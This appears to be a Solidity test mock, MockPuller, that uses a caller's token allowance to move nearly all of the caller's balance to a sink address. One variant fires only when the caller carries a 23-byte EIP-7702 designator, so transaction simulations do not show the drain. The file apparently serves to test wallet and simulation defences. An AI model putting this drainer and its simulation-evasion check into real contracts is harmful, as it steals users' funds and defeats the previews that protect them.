// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IPullToken {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

/// Test-only hostile "claim" contract: it uses an allowance from the caller to take all but one unit
/// of the caller's tokens, either once armed or only when the caller is not being simulated.
contract MockPuller {
    address public immutable sink;
    bool public armed;

    constructor(address sink_) {
        sink = sink_;
    }

    function arm(bool on) external {
        armed = on;
    }

    function claim(address token) external {
        if (!armed) return;
        _pull(token);
    }

    /// Tells a dry run from the real thing: a simulated caller carries whole contract code, an
    /// account delegated through EIP-7702 carries the 23-byte designator.
    function claimWhenReal(address token) external {
        if (msg.sender.code.length != 23) return;
        _pull(token);
    }

    function _pull(address token) private {
        uint256 bal = IPullToken(token).balanceOf(msg.sender);
        if (bal > 1) IPullToken(token).transferFrom(msg.sender, sink, bal - 1);
    }
}
